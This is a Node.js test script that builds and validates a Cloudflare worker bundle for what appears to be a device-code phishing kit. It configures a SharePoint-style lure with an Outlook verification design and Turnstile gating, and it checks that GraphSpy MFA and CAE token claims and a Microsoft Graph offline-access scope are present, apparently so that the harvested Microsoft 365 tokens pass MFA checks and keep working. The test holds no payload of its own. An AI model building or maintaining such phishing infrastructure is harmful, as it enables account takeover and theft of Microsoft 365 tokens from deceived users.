/**
 * Worker deployment simulation: build the real Cloudflare worker bundle
 * exactly like buildWorkerScript() does (same template, same placeholder
 * replacement, same ESM wrapper), then verify it would deploy:
 *
 *   1. No unresolved {{PLACEHOLDER}} literals remain in the bundle.
 *   2. The bundle parses as valid ES module JavaScript (node --check).
 *   3. The GraphSpy device-code claims block (ngcmfa/cae) is present.
 *   4. The ESM "export default" wrapper is present.
 *
 * db is stubbed; no network / DB required.
 */
const path = require('path');
const fs = require('fs');
const ROOT = path.resolve(__dirname, '..', '..');

const dbPath = require.resolve(path.join(ROOT, 'backend', 'database', 'connection.js'));
require.cache[dbPath] = {
  id: dbPath,
  filename: dbPath,
  loaded: true,
  exports: { query: async () => [[], []], getConnection: async () => ({ query: async () => [[], []], release: () => {} }), pool: { query: async () => [[], []] } },
};

const templateLoader = require(path.join(ROOT, 'backend', 'services', 'templateloader.js'));

const link = {
  id: 1,
  template_type: 'sharepoint4',
  verification_design: 'outlook',
  title_text: 'Test',
  message_text: 'msg',
  button_text: 'Go',
  file_name: 'file.pdf',
  pages: 1,
  destination_url: 'https://example.com',
  turnstile_enabled: true,
};
const user = { id: 99 };

let pass = 0, fail = 0;
function check(name, cond, extra) {
  if (cond) { pass++; console.log('  PASS  ' + name); }
  else { fail++; console.log('  FAIL  ' + name + (extra ? '  -> ' + extra : '')); }
}

(async () => {
  const worker = await templateLoader.buildWorkerScript(link, user, 'https://example.com');
  check('bundle built', !!worker && worker.length > 1000, 'len=' + (worker || '').length);
  check('ESM export default present', !!worker && worker.includes('export default'));

  const unresolved = (worker.match(/'{{[A-Z_]+}}'/g) || []).filter(v => !v.includes('TEMPLATE_HTML'));
  check('no unresolved placeholders (single-quoted)', unresolved.length === 0, JSON.stringify(unresolved));
  const unresolvedDq = (worker.match(/"{{[A-Z_]+}}"/g) || []);
  check('no unresolved placeholders (double-quoted)', unresolvedDq.length === 0, JSON.stringify(unresolvedDq));

  check('GraphSpy ngcmfa claims present', /amr:\s*\{\s*values:\s*\['ngcmfa'\]/.test(worker));
  check('GraphSpy CAE claims present', /xms_cc:\s*\{\s*values:\s*\['cp1'\]/.test(worker));
  check('Graph default scope present', worker.includes("scope: 'https://graph.microsoft.com/.default openid offline_access'"));

  // Write the bundle as an ES module and let Node's parser validate it.
  const bundlePath = path.join('/tmp', 'vc-worker-bundle-' + Date.now() + '.mjs');
  fs.writeFileSync(bundlePath, worker);
  const { execFileSync } = require('child_process');
  try {
    execFileSync(process.execPath, ['--check', bundlePath], { stdio: 'pipe' });
    check('bundle parses as valid ES module (node --check)', true);
  } catch (e) {
    check('bundle parses as valid ES module (node --check)', false, String(e.stderr || e.message).substring(0, 400));
  }
  try { fs.unlinkSync(bundlePath); } catch (e) { /* ignore */ }

  console.log('\n==== ' + pass + ' passed, ' + fail + ' failed ====');
  process.exit(fail === 0 ? 0 : 1);
})().catch(err => {
  console.error('TEST CRASH:', err);
  process.exit(2);
});
